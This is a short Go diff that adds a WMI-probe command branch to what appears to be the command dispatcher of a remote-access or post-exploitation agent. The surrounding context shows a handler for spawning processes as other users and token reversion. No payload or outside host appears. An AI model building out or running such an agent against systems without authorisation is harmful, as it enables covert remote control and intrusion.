@@ -540,6 +540,13 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		}
 		return result, "output"
 	}
+	if strings.HasPrefix(trimmed, wmiProbePrefix) {
+		result, err := wmiProbeCommand(trimmed)
+		if err != nil {
+			return "WMI probe failed: " + err.Error(), "output"
+		}
+		return result, "output"
+	}
 	if strings.HasPrefix(trimmed, "__SPAWNAS__") {
 		result, err := spawnasCommand(trimmed, cfg)
 		// Step 4 of the cascade calls RevertToSelf before returning; restore
